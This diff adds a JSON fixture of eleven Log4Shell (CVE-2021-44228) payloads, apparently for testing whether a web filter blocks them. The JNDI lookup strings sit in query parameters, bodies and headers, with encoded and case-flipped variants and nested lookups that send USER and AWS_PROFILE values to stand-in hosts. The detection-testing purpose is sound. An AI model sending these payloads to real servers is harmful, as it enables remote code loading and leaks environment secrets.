@@ -1,0 +1,109 @@
+{
+  "category": "Log4Shell (CVE-2021-44228)",
+  "cwe": "CWE-74",
+  "owasp": "A06:2021 - Vulnerable and Outdated Components",
+  "description": "JNDI lookup payloads for testing Log4Shell detection. Reference: CVE-2021-44228, CVE-2021-45046.",
+  "payloads": [
+    {
+      "id": "LOG4J-001",
+      "name": "Basic JNDI LDAP lookup",
+      "method": "GET",
+      "path": "/search",
+      "query": "query=${jndi:ldap://test.example.com/a}",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-002",
+      "name": "JNDI DNS lookup (POST body)",
+      "method": "POST",
+      "path": "/api/log",
+      "body": {"message": "${jndi:dns://test.example.com/probe}"},
+      "content_type": "application/json",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-003",
+      "name": "JNDI RMI protocol",
+      "method": "GET",
+      "path": "/admin",
+      "query": "data=${jndi:rmi://192.168.1.100:1099/exploit}",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-004",
+      "name": "JNDI CORBA protocol",
+      "method": "GET",
+      "path": "/login",
+      "query": "input=${jndi:corba://test.example.com:1389/a}",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-005",
+      "name": "Log4Shell in User-Agent header",
+      "method": "GET",
+      "path": "/",
+      "headers": {"User-Agent": "Mozilla/5.0 ${jndi:ldap://test.huntress.com/hostname}"},
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-006",
+      "name": "Log4Shell in X-Forwarded-For header",
+      "method": "GET",
+      "path": "/",
+      "headers": {"X-Forwarded-For": "${jndi:ldap://test.example.com/a}"},
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-007",
+      "name": "Case-flipped obfuscation",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=${JNDI:LDAP://TEST.EXAMPLE.COM/EXPLOIT}",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-008",
+      "name": "Nested env var lookup",
+      "method": "POST",
+      "path": "/api/config",
+      "body": {"config": "${jndi:ldap://${env:USER}.test.example.com/a}"},
+      "content_type": "application/json",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-009",
+      "name": "AWS_PROFILE enumeration probe",
+      "method": "GET",
+      "path": "/test",
+      "query": "param=${jndi:ldap://test.example.com/${env:AWS_PROFILE}/exploit}",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-010",
+      "name": "URL-encoded JNDI",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%24%7Bjndi%3Aldap%3A%2F%2Ftest.example.com%2Fa%7D",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "LOG4J-011",
+      "name": "Double-encoded JNDI",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%2524%257Bjndi%253Aldap%253A%252F%252Ftest.example.com%252Fa%257D",
+      "severity": "CRITICAL",
+      "expected": "block"
+    }
+  ]
+}
